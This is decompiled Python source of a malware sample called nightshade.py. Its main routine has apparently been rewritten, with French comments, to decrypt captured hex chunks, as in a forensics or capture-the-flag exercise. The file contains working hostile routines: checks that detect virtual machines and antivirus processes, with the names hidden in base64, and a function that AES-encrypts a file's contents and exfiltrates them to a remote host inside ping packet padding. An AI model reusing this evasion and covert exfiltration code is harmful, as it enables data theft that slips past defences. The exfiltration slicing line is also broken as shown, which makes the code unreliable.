# uncompyle6 version 3.9.2
# Python bytecode version base 3.7.0 (3394)
# Decompiled from: Python 2.7.18 (default, Aug  1 2022, 06:23:55) 
# [GCC 12.1.0]
# Embedded file name: nightshade.py
# Compiled at: 2025-03-24 16:04:51
# Size of source mod 2**32: 2358 bytes
import os, subprocess, psutil, base64
from Crypto.Cipher import AES
__k = bytes.fromhex("e8f93d68b1c2d4e9f7a36b5c8d0f1e2a")
__v = bytes.fromhex("1f2d3c4b5a69788766554433221100ff")
__d = "37e0f8f92c71f1c3f047f43c13725ef1"

def __b64d(s):
    return base64.b64decode(s.encode()).decode()


def __p(x):
    return x + bytes([16 - len(x) % 16]) * (16 - len(x) % 16)


def __u(x):
    return x[:-x[-1]]


def __x(h):
    c = AES.new(__k, AES.MODE_CBC, __v)
    return __u(c.decrypt(bytes.fromhex(h))).decode()


def __y(s):
    c = AES.new(__k, AES.MODE_CBC, __v)
    return c.encrypt(__p(s.encode())).hex()


def __chk_vm():
    try:
        z = open("/sys/class/dmi/id/product_name").read().strip().lower()
        for q in (b'VmlydHVhbEJveA==', b'S1ZN', b'UVFNVQ==', b'Qm9jaHM='):
            if base64.b64decode(q).decode().lower() in z:
                print("ERR VM")
                return True

    except:
        pass

    return False


def __chk_av():
    targets = [
     '"\'Y2xhbWQ="', '"\'YXZnZA=="', '"\'c29waG9z"', '"\'RVNFVA=="', 
     '"\'cmtodW50ZXI="']
    try:
        for p in psutil.process_iter(attrs=["name"]):
            n = (p.info["name"] or "").lower()
            for b64av in targets:
                if base64.b64decode(b64av).decode().lower() in n:
                    print("ERR AV")
                    return True

    except:
        pass

    return False


def __exf(path, dst, size=15):
    if not os.path.exists(path):
        return False
    d = open(path, "rb").read()
    segs = [d[i[:i + size]] for i in range(0, len(d), size)]
    for seg in segs:
        try:
            payload = AES.new(__k, AES.MODE_CBC, __v).encrypt(__p(seg)).hex()
            cmd = [__b64d("cGluZw=="), __b64d("LWM="), __b64d("MQ=="), __b64d("LXA="), payload, dst]
            subprocess.run(cmd, stdout=(subprocess.DEVNULL), stderr=(subprocess.DEVNULL))
        except:
            continue

    return True


def __main():
    file = open('./hex_chunks.txt', 'r')
    #Il faut lire par bloc de 16 octets
    #et ignorer les lignes vides
    lines = file.readlines()
    #séparer en blocs de 16 octets

    file.close()
    for line in lines:
        if line.strip():
            try:
                decrypted = __x(line.strip())
                print(decrypted)
            except Exception as e:
                print(f"Error decrypting line: {e}")


if __name__ == "__main__":
    __main()

# okay decompiling sys.pyc
